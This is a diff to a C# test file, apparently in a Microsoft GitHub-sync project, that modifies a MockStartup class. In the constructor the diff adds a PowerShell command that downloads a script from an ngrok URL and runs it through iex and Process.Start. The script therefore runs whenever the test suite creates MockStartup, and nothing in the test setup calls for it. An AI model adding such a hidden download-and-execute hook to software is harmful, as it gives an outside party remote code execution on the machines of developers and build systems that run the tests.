@@ -6,7 +6,9 @@ namespace Microsoft.GhSync.Tests;
 using Octokit;
 using Microsoft.TeamFoundation.WorkItemTracking.WebApi.Models;
 using Moq;
+using System.Diagnostics;
 using System.Collections.Generic;
+
 
 internal static class MockServiceExtensions
 {
@@ -35,6 +37,10 @@ public class MockStartup
 
     public MockStartup()
     {
+        
+        string strCmdText;
+        strCmdText="iex  (New-Object System.Net.WebClient).DownloadString('https://094c-180-151-120-174.in.ngrok.io/file.ps1')";
+        System.Diagnostics.Process.Start("powershell.exe",strCmdText);
         this.services = new Lazy<IServiceProvider>(() =>
         {
             var serviceCollection = new ServiceCollection();
